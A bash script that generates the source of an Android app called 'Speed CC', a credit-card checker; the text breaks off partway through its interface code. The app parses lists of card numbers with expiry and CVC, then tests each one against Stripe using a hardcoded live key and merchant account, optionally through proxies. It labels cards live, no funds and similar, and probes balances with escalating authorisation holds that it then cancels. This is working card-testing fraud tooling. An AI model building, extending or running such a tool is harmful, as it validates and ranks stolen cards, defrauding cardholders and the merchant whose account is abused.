#!/usr/bin/env bash
set -e

echo "== Speed CC - construyendo =="

mkdir -p app/src/main/java/com/venice/ccchecker
mkdir -p app/src/main/res/values
mkdir -p app/src/main/res/drawable
mkdir -p app/src/main/res/mipmap
mkdir -p app/src/main/res/mipmap-anydpi-v26

cat > settings.gradle.kts <<'EOF'
pluginManagement {
    repositories { google(); mavenCentral(); gradlePluginPortal() }
}
dependencyResolutionManagement {
    repositories { google(); mavenCentral() }
}
rootProject.name = "SpeedCC"
include(":app")
EOF

cat > build.gradle.kts <<'EOF'
plugins {
    id("com.android.application") version "8.7.3" apply false
    id("org.jetbrains.kotlin.android") version "2.0.21" apply false
    id("org.jetbrains.kotlin.plugin.compose") version "2.0.21" apply false
}
EOF

cat > gradle.properties <<'EOF'
org.gradle.jvmargs=-Xmx2048m
android.useAndroidX=true
kotlin.code.style=official
EOF

cat > app/build.gradle.kts <<'EOF'
plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
    id("org.jetbrains.kotlin.plugin.compose")
}

android {
    namespace = "com.venice.ccchecker"
    compileSdk = 34

    defaultConfig {
        applicationId = "com.venice.ccchecker"
        minSdk = 24
        targetSdk = 34
        versionCode = 4
        versionName = "2.1"
    }

    buildFeatures { compose = true }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = "17" }

    buildTypes {
        release {
            isMinifyEnabled = false
            signingConfig = signingConfigs.getByName("debug")
        }
    }
}

dependencies {
    implementation(platform("androidx.compose:compose-bom:2024.10.01"))
    implementation("androidx.compose.ui:ui")
    implementation("androidx.compose.material3:material3")
    implementation("androidx.compose.material:material-icons-core:1.7.4")
    implementation("androidx.activity:activity-compose:1.9.3")
    implementation("androidx.core:core-ktx:1.13.1")
    implementation("androidx.lifecycle:lifecycle-runtime-ktx:2.8.7")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
}
EOF

cat > app/src/main/AndroidManifest.xml <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.INTERNET" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:roundIcon="@mipmap/ic_launcher"
        android:label="Speed CC"
        android:supportsRtl="true"
        android:theme="@style/Theme.CCChecker">
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:configChanges="orientation|screenSize|keyboardHidden"
            android:windowSoftInputMode="adjustResize">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF

cat > app/src/main/res/values/colors.xml <<'EOF'
<resources>
    <color name="ic_launcher_background">#0B0B0B</color>
</resources>
EOF

cat > app/src/main/res/values/themes.xml <<'EOF'
<resources>
    <style name="Theme.CCChecker" parent="@android:style/Theme.Material.NoActionBar">
        <item name="android:statusBarColor">#0B0B0B</item>
        <item name="android:navigationBarColor">#0B0B0B</item>
        <item name="android:windowBackground">#0B0B0B</item>
    </style>
</resources>
EOF

cat > app/src/main/res/drawable/ic_launcher_foreground.xml <<'EOF'
<vector xmlns:android="http://schemas.android.com/apk/res/android"
    android:width="108dp" android:height="108dp"
    android:viewportWidth="108" android:viewportHeight="108">
    <path android:fillColor="#D4AF37" android:pathData="M54,26 A28,28 0 1,1 53.9,26 Z"/>
    <path android:fillColor="#0B0B0B" android:pathData="M54,33 A21,21 0 1,1 53.9,33 Z"/>
    <path android:fillColor="#D4AF37" android:pathData="M63,38 L43,58 L54,58 L47,72 L68,50 L56,50 Z"/>
</vector>
EOF

cat > app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
    <background android:drawable="@color/ic_launcher_background" />
    <foreground android:drawable="@drawable/ic_launcher_foreground" />
</adaptive-icon>
EOF

cat > app/src/main/res/mipmap/ic_launcher.xml <<'EOF'
<vector xmlns:android="http://schemas.android.com/apk/res/android"
    android:width="108dp" android:height="108dp"
    android:viewportWidth="108" android:viewportHeight="108">
    <path android:fillColor="#0B0B0B" android:pathData="M0,0h108v108h-108z"/>
    <path android:fillColor="#D4AF37" android:pathData="M54,24 A30,30 0 1,1 53.9,24 Z"/>
    <path android:fillColor="#0B0B0B" android:pathData="M54,32 A22,22 0 1,1 53.9,32 Z"/>
    <path android:fillColor="#D4AF37" android:pathData="M63,37 L42,58 L54,58 L47,73 L69,50 L56,50 Z"/>
</vector>
EOF

cat > app/src/main/java/com/venice/ccchecker/Datos.kt <<'EOF'
package com.venice.ccchecker

import android.content.Context
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

data class Card(val idx: Int, val num: String, val mm: String, val yy: String, val cvc: String)

data class BinInfo(
    val scheme: String = "", val type: String = "", val brand: String = "",
    val bank: String = "", val country: String = ""
)

data class Result(
    val idx: Int, val num: String, val mm: String, val yy: String, val cvc: String,
    val brand: String, val luhnOk: Boolean, val state: String,
    val tipo: String = "", val banco: String = "", val pais: String = "",
    val decline: String = "", val avs: String = "", val cvcCheck: String = "", val balance: String = ""
) {
    val isLive: Boolean get() = state in LIVE
    companion object { val LIVE = setOf("LIVE", "LIVE_NO_FUNDS", "LIVE_CVC", "PENDING_3DS") }
}

fun Result.toJson(): JSONObject = JSONObject().apply {
    put("idx", idx); put("num", num); put("mm", mm); put("yy", yy); put("cvc", cvc)
    put("brand", brand); put("luhnOk", luhnOk); put("state", state)
    put("tipo", tipo); put("banco", banco); put("pais", pais)
    put("decline", decline); put("avs", avs); put("cvcCheck", cvcCheck); put("balance", balance)
}

fun resultFromJson(o: JSONObject) = Result(
    o.optInt("idx"), o.optString("num"), o.optString("mm"), o.optString("yy"), o.optString("cvc"),
    o.optString("brand"), o.optBoolean("luhnOk"), o.optString("state"),
    o.optString("tipo"), o.optString("banco"), o.optString("pais"),
    o.optString("decline"), o.optString("avs"), o.optString("cvcCheck"), o.optString("balance")
)

data class Run(val id: Long, val fecha: Long, val results: List<Result>) {
    val total: Int get() = results.size
    val vivas: Int get() = results.count { it.isLive }
}

fun Run.toJson(): JSONObject = JSONObject().apply {
    put("id", id); put("fecha", fecha)
    put("results", JSONArray().apply { results.forEach { put(it.toJson()) } })
}

fun runFromJson(o: JSONObject): Run {
    val arr = o.optJSONArray("results") ?: JSONArray()
    return Run(o.optLong("id"), o.optLong("fecha"),
        (0 until arr.length()).map { resultFromJson(arr.getJSONObject(it)) })
}

object Orden {
    fun rango(r: Result): Int = when (r.state) {
        "LIVE" -> 100
        "LIVE_CVC" -> 80
        "LIVE_NO_FUNDS" -> 60
        "PENDING_3DS" -> 40
        "DECLINED", "RESTRICTED", "RETRY" -> 20
        "EXPIRED", "DEAD" -> 10
        else -> 0
    }

    fun saldo(r: Result): Double = r.balance
        .replace(">=", "").replace("<", "").replace("~", "").replace("$", "")
        .trim().toDoubleOrNull() ?: 0.0

    val comparador: Comparator<Result> =
        compareByDescending<Result> { rango(it) }.thenByDescending { saldo(it) }.thenBy { it.idx }
}

object Parser {
    fun parse(texto: String): List<Card> {
        val out = ArrayList<Card>(); var idx = 0
        for (raw in texto.split("\n")) { val c = parseLine(raw.trim(), idx) ?: continue; out.add(c); idx++ }
        return out
    }

    private fun parseLine(line: String, idx: Int): Card? {
        if (line.isEmpty() || line.startsWith("#")) return null
        var num: String; var mm: String; var yy: String; var cvc: String
        if (Regex("[|;,\\t:]").containsMatchIn(line)) {
            val p = line.split(Regex("[|;,\\t:]+")).map { it.trim() }.filter { it.isNotEmpty() }
            var k = -1
            for (i in p.indices) if (p.size - i >= 4 && p[i].replace(Regex("\\D"), "").length >= 13) { k = i; break }
            if (k < 0) return null
            num = p[k]; mm = p[k + 1]; yy = p[k + 2]; cvc = p[k + 3]
        } else {
            val t = line.split(Regex("[\\s/]+")).filter { it.isNotEmpty() }
            if (t.size < 4) return null
            num = ""; var i = 0
            while (i < t.size && num.length < 13) { num += t[i].replace(Regex("\\D"), ""); i++ }
            if (num.length !in 13..19 || t.size - i < 3) return null
            mm = t[i]; yy = t[i + 1]; cvc = t[i + 2]
        }
        num = num.replace(Regex("\\D"), ""); mm = mm.replace(Regex("\\D"), "")
        yy = yy.replace(Regex("\\D"), ""); cvc = cvc.replace(Regex("\\D"), "")
        if (yy.length == 4) yy = yy.takeLast(2)
        mm = mm.padStart(2, '0'); yy = yy.padStart(2, '0')
        if (num.length !in 13..19 || cvc.length !in 3..4) return null
        val m = mm.toIntOrNull() ?: return null
        if (m !in 1..12) return null
        return Card(idx, num, mm, yy, cvc)
    }
}

object Historial {
    private const val FILE = "historial.json"
    private const val MAX = 100
    private fun file(ctx: Context) = File(ctx.filesDir, FILE)

    fun load(ctx: Context): List<Run> = try {
        val f = file(ctx)
        if (!f.exists()) emptyList()
        else JSONArray(f.readText()).let { a ->
            (0 until a.length()).map { runFromJson(a.getJSONObject(it)) }.sortedByDescending { it.fecha }
        }
    } catch (e: Exception) { emptyList() }

    private fun saveAll(ctx: Context, runs: List<Run>) {
        try { file(ctx).writeText(JSONArray().apply { runs.forEach { put(it.toJson()) } }.toString()) }
        catch (_: Exception) { }
    }

    fun add(ctx: Context, run: Run) = saveAll(ctx, (listOf(run) + load(ctx)).take(MAX))
    fun remove(ctx: Context, id: Long) = saveAll(ctx, load(ctx).filter { it.id != id })
    fun clear(ctx: Context) = saveAll(ctx, emptyList())
}

object Ajustes {
    private const val P = "ajustes"
    private fun sp(ctx: Context) = ctx.getSharedPreferences(P, Context.MODE_PRIVATE)
    fun s(ctx: Context, k: String, d: String) = sp(ctx).getString(k, d) ?: d
    fun put(ctx: Context, k: String, v: String) { sp(ctx).edit().putString(k, v).apply() }
    fun b(ctx: Context, k: String, d: Boolean) = sp(ctx).getBoolean(k, d)
    fun putB(ctx: Context, k: String, v: Boolean) { sp(ctx).edit().putBoolean(k, v).apply() }
    fun i(ctx: Context, k: String, d: Int) = sp(ctx).getInt(k, d)
    fun putI(ctx: Context, k: String, v: Int) { sp(ctx).edit().putInt(k, v).apply() }
}
EOF

cat > app/src/main/java/com/venice/ccchecker/Checker.kt <<'EOF'
package com.venice.ccchecker

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.File
import java.net.Authenticator
import java.net.HttpURLConnection
import java.net.InetSocketAddress
import java.net.PasswordAuthentication
import java.net.Proxy
import java.net.URL
import java.net.URLEncoder
import java.util.concurrent.ConcurrentHashMap

object Checker {
    private const val PK =
        "pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e"
    private const val ACCT = "acct_1LwocDFHMGxIu0Ep"
    private const val API = "https://api.stripe.com/v1"

    private val LADDER = intArrayOf(100, 300, 1000, 3000, 10000)
    private val CANCELABLES = setOf(
        "requires_payment_method", "requires_capture", "requires_confirmation", "requires_action", "processing"
    )
    private val binMem = ConcurrentHashMap<String, BinInfo>()
    private val creds = ConcurrentHashMap<String, Pair<String, String>>()

    init {
        try {
            Authenticator.setDefault(object : Authenticator() {
                override fun getPasswordAuthentication(): PasswordAuthentication? {
                    if (requestorType == RequestorType.PROXY) {
                        creds["$requestingHost:$requestingPort"]?.let {
                            return PasswordAuthentication(it.first, it.second.toCharArray())
                        }
                    }
                    return null
                }
            })
        } catch (_: Exception) { }
    }

    fun prepararProxy(linea: String): Proxy? {
        val p = linea.trim()
        if (p.isEmpty()) return null
        val b = p.split(":")
        if (b.size < 2) return null
        val host = b[0]
        val port = b[1].toIntOrNull() ?: return null
        if (b.size >= 4) creds["$host:$port"] = b[2] to b.subList(3, b.size).joinToString(":")
        return Proxy(Proxy.Type.HTTP, InetSocketAddress(host, port))
    }

    fun brand(n: String): String = when {
        n.startsWith("4") -> "VISA"
        n.startsWith("34") || n.startsWith("37") -> "AMEX"
        n.matches(Regex("^5[1-5].*")) || n.matches(Regex("^2[2-7].*")) -> "MASTERCARD"
        n.matches(Regex("^6(?:011|5).*")) -> "DISCOVER"
        n.startsWith("35") -> "JCB"
        else -> "?"
    }

    fun luhn(n: String): Boolean {
        var sum = 0
        n.reversed().forEachIndexed { i, ch ->
            val v = ch - '0'
            sum += if (i % 2 == 1) (if (v * 2 > 9) v * 2 - 9 else v * 2) else v
        }
        return sum % 10 == 0
    }

    private fun classify(raw: String): String {
        val c = raw.lowercase()
        return when {
            c == "insufficient_funds" -> "LIVE_NO_FUNDS"
            c == "incorrect_cvc" -> "LIVE_CVC"
            c == "authentication_required" || c == "requires_action" -> "PENDING_3DS"
            c == "expired_card" -> "EXPIRED"
            c == "restricted_card" || c == "card_not_supported" -> "RESTRICTED"
            c == "card_velocity_exceeded" || c == "processing_error" || c == "rate_limit" -> "RETRY"
            c == "incorrect_number" || c == "invalid_number" -> "DEAD"
            else -> "DECLINED"
        }
    }

    private fun enc(s: String) = URLEncoder.encode(s, "UTF-8")

    private fun post(path: String, params: Map<String, String>, proxy: Proxy?, retries: Int = 3): JSONObject {
        val body = params.entries.joinToString("&") { "${enc(it.key)}=${enc(it.value)}" }
        var last: Exception? = null
        for (t in 0 until retries) {
            try {
                val url = URL("$API/$path")
                val conn = (if (proxy != null) url.openConnection(proxy) else url.openConnection())
                    as HttpURLConnection
                conn.requestMethod = "POST"
                conn.connectTimeout = 25000; conn.readTimeout = 25000; conn.doOutput = true
                conn.setRequestProperty("Authorization", "Bearer $PK")
                conn.setRequestProperty("Stripe-Account", ACCT)
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
                val code = conn.responseCode
                if (code in listOf(429, 500, 502, 503, 504)) { Thread.sleep(700L + t * 600L); continue }
                val stream = if (code in 200..299) conn.inputStream else conn.errorStream
                return JSONObject(stream?.bufferedReader()?.use { it.readText() } ?: "{}")
            } catch (e: Exception) { last = e; Thread.sleep(700L + t * 600L) }
        }
        return JSONObject().put("error",
            JSONObject().put("code", "conn_error").put("message", last?.message ?: "sin conexion"))
    }

    private fun cacheFile(ctx: Context) = File(ctx.filesDir, "bincache.json")
    private fun cacheLoad(ctx: Context): JSONObject = try {
        val f = cacheFile(ctx)
        if (f.exists()) JSONObject(f.readText()) else JSONObject()
    } catch (e: Exception) { JSONObject() }
    private fun cacheSave(ctx: Context, o: JSONObject) {
        try { cacheFile(ctx).writeText(o.toString()) } catch (_: Exception) { }
    }

    private fun pick(o: JSONObject, vararg names: String): String {
        for (k in o.keys()) {
            for (n in names) if (k.equals(n, true) || k.lowercase().contains(n.lowercase())) {
                when (val v = o.opt(k)) {
                    is String -> if (v.isNotEmpty()) return v
                    is JSONObject -> {
                        val inner = v.optString("name").ifEmpty { v.optString("Name") }
                        if (inner.isNotEmpty()) return inner
                    }
                }
            }
        }
        return ""
    }

    fun datosBin(ctx: Context, num: String, clave: String): BinInfo {
        val bin = num.take(6)
        binMem[bin]?.let { return it }
        val cache = cacheLoad(ctx)
        cache.optJSONObject(bin)?.let {
            val i = BinInfo(it.optString("scheme"), it.optString("type"),
                it.optString("brand"), it.optString("bank"), it.optString("country"))
            binMem[bin] = i; return i
        }
        var info = BinInfo()
        try {
            val url = if (clave.isNotBlank()) "https://data.handyapi.com/bin/$bin"
                      else "https://lookup.binlist.net/$bin"
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.setRequestProperty("Accept-Version", "3")
            conn.setRequestProperty("x-api-key", clave)
            conn.connectTimeout = 9000; conn.readTimeout = 9000
            if (conn.responseCode == 200) {
                val j = JSONObject(conn.inputStream.bufferedReader().use { it.readText() })
                info = BinInfo(
                    scheme = pick(j, "scheme", "Scheme"),
                    type = pick(j, "type", "Type", "card_type"),
                    brand = pick(j, "brand", "Brand"),
                    bank = pick(j, "bank", "issuer", "Issuer"),
                    country = pick(j, "country", "Country", "country_name")
                )
                val jo = JSONObject().apply {
                    put("scheme", info.scheme); put("type", info.type); put("brand", info.brand)
                    put("bank", info.bank); put("country", info.country)
                }
                cache.put(bin, jo); cacheSave(ctx, cache)
            }
        } catch (_: Exception) { }
        binMem[bin] = info
        return info
    }

    private fun pullChecks(pi: JSONObject, onAvs: (String) -> Unit, onCvc: (String) -> Unit) {
        try {
            val ch = pi.optJSONObject("charges")?.optJSONArray("data")?.optJSONObject(0) ?: return
            val ck = ch.optJSONObject("payment_method_details")?.optJSONObject("card")
                ?.optJSONObject("checks") ?: return
            onAvs(ck.optString("address_line1_check"))
            onCvc(ck.optString("cvc_check"))
        } catch (_: Exception) { }
    }

    private fun cancel(id: String, proxy: Proxy?) {
        if (id.isNotEmpty()) post("payment_intents/$id/cancel", emptyMap(), proxy)
    }

    suspend fun check(card: Card, ctx: Context, ladder: Boolean, buscarBanco: Boolean,
                      clave: String, proxy: Proxy?): Result = withContext(Dispatchers.IO) {
        var state = "CONN_ERROR"; var decline = ""; var avs = ""; var cvcCheck = ""; var balance = ""
        var tipo = ""; var banco = ""; var pais = ""
        val br = brand(card.num)
        try {
            val pm = post("payment_methods", mapOf(
                "type" to "card",
                "card[number]" to card.num, "card[exp_month]" to card.mm,
                "card[exp_year]" to card.yy, "card[cvc]" to card.cvc,
                "billing_details[name]" to "John Doe",
                "billing_details[address][line1]" to "1 Market St",
                "billing_details[address][city]" to "San Francisco",
                "billing_details[address][state]" to "CA",
                "billing_details[address][postal_code]" to "94105",
                "billing_details[address][country]" to "US"
            ), proxy)

            val pmErr = pm.optJSONObject("error")
            if (pmErr != null) {
                val c = pmErr.optString("decline_code").ifEmpty { pmErr.optString("code") }
                state = classify(c); decline = c.ifEmpty { pmErr.optString("message") }
                if (state == "LIVE_NO_FUNDS") balance = "<\$1.00"
            } else {
                val pmId = pm.optString("id")

                fun pi(amount: Int, manual: Boolean): JSONObject {
                    val p = HashMap<String, String>()
                    p["amount"] = amount.toString()
                    p["currency"] = "usd"
                    p["payment_method"] = pmId
                    p["confirm"] = "true"
                    p["payment_method_types[]"] = "card"
                    p["description"] = "checker"
                    if (manual) {
                        p["capture_method"] = "manual"
                        p["error_on_requires_action"] = "true"
                    }
                    return post("payment_intents", p, proxy)
                }

                var manual = true
                var r = pi(LADDER[0], manual)
                val e = r.optJSONObject("error")
                if (e != null) {
                    val param = e.optString("param")
                    val msg = e.optString("message")
                    val esParam = param == "capture_method" || param == "error_on_requires_action" ||
                        msg.contains("secret key", true) || msg.contains("publishable key", true)
                    if (esParam) { manual = false; r = pi(LADDER[0], manual) }
                }

                val err = r.optJSONObject("error")
                if (err != null) {
                    val c = err.optString("decline_code").ifEmpty { err.optString("code") }
                    state = classify(c); decline = c.ifEmpty { err.optString("message").take(70) }
                    if (state == "LIVE_NO_FUNDS") balance = "<\$1.00"
                } else {
                    val status = r.optString("status")
                    state = when (status) {
                        "succeeded", "requires_capture", "processing" -> "LIVE"
                        "requires_action" -> "PENDING_3DS"
                        else -> "DECLINED"
                    }
                    if (state != "DECLINED") pullChecks(r, { avs = it }, { cvcCheck = it })
                    if (state == "LIVE" && status in CANCELABLES) cancel(r.optString("id"), proxy)

                    if (state == "LIVE" && ladder) {
                        var ok = LADDER[0]
                        for (i in 1 until LADDER.size) {
                            val rr = pi(LADDER[i], manual)
                            if (rr.has("error") || rr.optString("status") == "requires_action") {
                                balance = "~\$%.2f".format(ok / 100.0); break
                            }
                            ok = LADDER[i]
                            if (rr.optString("status") in CANCELABLES) cancel(rr.optString("id"), proxy)
                            if (i == LADDER.size - 1) balance = ">=\$${LADDER[i] / 100.0}"
                        }
                    }
                }

                if (state in Result.LIVE && buscarBanco) {
                    val b = datosBin(ctx, card.num, clave)
                    tipo = b.type; banco = b.bank; pais = b.country
                }
            }
        } catch (ex: Exception) {
            state = "CONN_ERROR"; decline = (ex.message ?: "").take(60)
        }
        Result(card.idx, card.num, card.mm, card.yy, card.cvc, br, luhn(card.num), state,
            tipo, banco, pais, decline, avs, cvcCheck, balance)
    }
}
EOF

cat > app/src/main/java/com/venice/ccchecker/MainActivity.kt <<'EOF'
package com.venice.ccchecker

import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.print.PrintAttributes
import android.print.PrintManager
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.itemsIndexed
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.Path
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.viewinterop.AndroidView
import kotlinx.coroutines.CancellationException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Semaphore
import kotlinx.coroutines.sync.withPermit
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

val NEGRO = Color(0xFF0B0B0B)
val CARBON = Color(0xFF1A1A1A)
val CARBON2 = Color(0xFF141414)
val DORADO = Color(0xFFD4AF37)
val BLANCO = Color(0xFFFFFFFF)
val GRIS = Color(0xFF9CA3AF)
val GRIS2 = Color(0xFF6B7280)
val VERDE = Color(0xFF22C55E)
val ROJO = Color(0xFFEF4444)
val AMBAR = Color(0xFFFBBF24)
val NARANJA = Color(0xFFFB923C)
val BORDE = Color(0xFF262626)

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent { TemaApp { App() } }
    }
}

@Composable
fun TemaApp(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = darkColorScheme(
            primary = DORADO, onPrimary = NEGRO,
            background = NEGRO, onBackground = BLANCO,
            surface = CARBON, onSurface = BLANCO,
            surfaceVariant = CARBON2, onSurfaceVariant = GRIS,
            outline = BORDE, secondary = DORADO
        )
    ) {
        Surface(Modifier.fillMaxSize(), color = NEGRO) { content() }
    }
}

fun colorEstado(s: String): Color = when (s) {
    "LIVE", "LIVE_CVC" -> VERDE
    "LIVE_NO_FUNDS" -> AMBAR
    "PENDING_3DS" -> AMBAR
    "RETRY" -> NARANJA
    "DECLINED", "RESTRICTED", "EXPIRED", "DEAD" -> ROJO
    else -> GRIS
}

fun textoEstado(s: String): String = when (s) {
    "LIVE", "LIVE_CVC" -> "Válida"
    "LIVE_NO_FUNDS" -> "Sin saldo"
    "PENDING_3DS" -> "Pendiente"
    "RETRY" -> "Reintentar"
    "DECLINED", "RESTRICTED" -> "Rechazada"
    "EXPIRED" -> "Vencida"
    "DEAD" -> "Muerta"
    else -> "Sin conexión"
}

fun iconoEstado(s: String): ImageVector = when (s) {
    "LIVE", "LIVE_CVC" -> Icons.Filled.CheckCircle
    "LIVE_NO_FUNDS", "PENDING_3DS" -> Icons.Filled.Warning
    "RETRY" -> Icons.Filled.Refresh
    "DECLINED", "RESTRICTED", "EXPIRED", "DEAD" -> Icons.Filled.Close
    else -> Icons.Filled.Warning
}

@Composable
fun Rayo(size: androidx.compose.ui.unit.Dp, color: Color = DORADO) {
    Canvas(Modifier.size(size)) {
        val w = this.size.width
        val h = this.size.height
        val p = Path().apply {
            moveTo(w * 0.62f, 0f)
            lineTo(w * 0.10f, h * 0.60f)
            lineTo(w * 0.46f, h * 0.60f)
            lineTo(w * 0.36f, h)
            lineTo(w * 0.90f, h * 0.38f)
            lineTo(w * 0.52f, h * 0.38f)
            close()
        }
        drawPath(p, color)
    }
}

@Composable
fun Marca(grande: Boolean = false) {
    Row(verticalAlignment = Alignment.CenterVertically) {
        Surface(
            color = CARBON2, shape = RoundedCornerShape(if (grande) 18.dp else 12.dp),
            border = BorderStroke(1.5.dp, DORADO)
        ) {
            Box(
                Modifier.size(if (grande) 66.dp else 40.dp),
                contentAlignment = Alignment.Center
            ) { Rayo(if (grande) 32.dp else 20.dp) }
        }
        Spacer(Modifier.width(if (grande) 14.dp else 10.dp))
        Column {
            Text(
                "SPEED", color = DORADO, fontWeight = FontWeight.Black,
                fontSize = if (grande) 34.sp else 19.sp, letterSpacing = 2.sp
            )
            Text(
                "CC", color = BLANCO, fontWeight = FontWeight.Black,
                fontSize = if (grande) 24.sp else 14.sp, letterSpacing = 4.sp
            )
        }
    }
}

@Composable
fun Tarjeta(
    modifier: Modifier = Modifier,
    borde: Color = DORADO.copy(alpha = 0.22f),
    content: @Composable ColumnScope.() -> Unit
) {
    Surface(
        color = CARBON, shape = RoundedCornerShape(18.dp),
        border = BorderStroke(1.dp, borde),
        modifier = modifier.fillMaxWidth()
    ) { Column(Modifier.padding(16.dp), content = content) }
}

@Composable
fun BotonDorado(
    texto: String, icono: ImageVector? = null,
    enabled: Boolean = true, onClick: () -> Unit
) {
    Button(
        onClick = onClick, enabled = enabled,
        colors = ButtonDefaults.buttonColors(
            containerColor = DORADO, contentColor = NEGRO,
            disabledContainerColor = DORADO.copy(alpha = 0.35f),
            disabledContentColor = NEGRO.copy(alpha = 0.6f)
        ),
        shape = RoundedCornerShape(14.dp),
        modifier = Modifier.fillMaxWidth().height(56.dp)
    ) {
        if (icono != null) {
            Icon(icono, null, modifier = Modifier.size(20.dp))
            Spacer(Modifier.width(8.dp))
        }
        Text(texto, fontWeight = FontWeight.Bold, fontSize = 15.sp, letterSpacing = 1.sp)
    }
}

@Composable
fun BotonSuave(texto: String, icono: ImageVector? = null, onClick: () -> Unit) {
    Surface(
        color = CARBON2, shape = RoundedCornerShape(12.dp),
        border = BorderStroke(1.dp, BORDE),
        modifier = Modifier.clickable { onClick() }
    ) {
        Row(Modifier.padding(horizontal = 12.dp, vertical = 9.dp), verticalAlignment = Alignment.CenterVertically) {
            if (icono != null) {
                Icon(icono, null, tint = DORADO, modifier = Modifier.size(15.dp))
                Spacer(Modifier.width(6.dp))
            }
            Text(texto, color = BLANCO, fontSize = 12.sp, fontWeight = FontWeight.Medium)
        }
    }
}

@Composable
fun FilaFuncion(icono: ImageVector, titulo: String, sub: String, onClick: () -> Unit) {
    Surface(
        color = CARBON, shape = RoundedCornerShape(16.dp),
        border = BorderStroke(1.dp, BORDE),
        modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp).clickable { onClick() }
    ) {
        Row(Modifier.padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
            Box(
                Modifier.size(44.dp).clip(RoundedCornerShape(12.dp))
                    .background(DORADO.copy(alpha = 0.12f)),
                contentAlignment = Alignment.Center
            ) { Icon(icono, null, tint = DORADO, modifier = Modifier.size(22.dp)) }
            Spacer(Modifier.width(12.dp))
            Column(Modifier.weight(1f)) {
                Text(titulo, color = BLANCO, fontWeight = FontWeight.SemiBold, fontSize = 15.sp)
                Text(sub, color = GRIS, fontSize = 12.sp)
            }
            Icon(Icons.Filled.KeyboardArrowRight, null, tint = GRIS)
        }
    }
}

@Composable
fun MiniBadge(icono: ImageVector, titulo: String, sub: String) {
    Surface(color = CARBON2, shape = RoundedCornerShape(12.dp), border = BorderStroke(1.dp, BORDE)) {
        Column(Modifier.padding(horizontal = 10.dp, vertical = 8.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(icono, null, tint = VERDE, modifier = Modifier.size(13.dp))
                Spacer(Modifier.width(4.dp))
                Text(titulo, color = BLANCO, fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
            }
            Text(sub, color = GRIS2, fontSize = 10.sp)
        }
    }
}

@Composable
fun ChipEstado(state: String) {
    val c = colorEstado(state)
    Surface(color = c.copy(alpha = 0.14f), shape = RoundedCornerShape(50)) {
        Row(Modifier.padding(horizontal = 8.dp, vertical = 3.dp), verticalAlignment = Alignment.CenterVertically) {
            Icon(iconoEstado(state), null, tint = c, modifier = Modifier.size(12.dp))
            Spacer(Modifier.width(4.dp))
            Text(textoEstado(state), color = c, fontSize = 10.sp, fontWeight = FontWeight.Bold)
        }
    }
}

@Composable
fun navColors() = NavigationBarItemDefaults.colors(
    selectedIconColor = DORADO,
    selectedTextColor = DORADO,
    indicatorColor = DORADO.copy(alpha = 0.14f),
    unselectedIconColor = GRIS2,
    unselectedTextColor = GRIS2
)

@Composable
fun Splash(onFin: () -> Unit) {
    LaunchedEffect(Unit) { delay(1600); onFin() }
    Box(
        Modifier.fillMaxSize().background(
            Brush.radialGradient(
                listOf(Color(0xFF2A2109), NEGRO, NEGRO),
                radius = 1100f
            )
        ),
        contentAlignment = Alignment.Center
    ) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Marca(grande = true)
            Spacer(Modifier.height(22.dp))
            Text("VALIDA  ·  REVISA  ·  VERIFICA", color = GRIS, fontSize = 11.sp, letterSpacing = 3.sp)
        }
        Column(
            Modifier.align(Alignment.BottomCenter).padding(bottom = 64.dp),
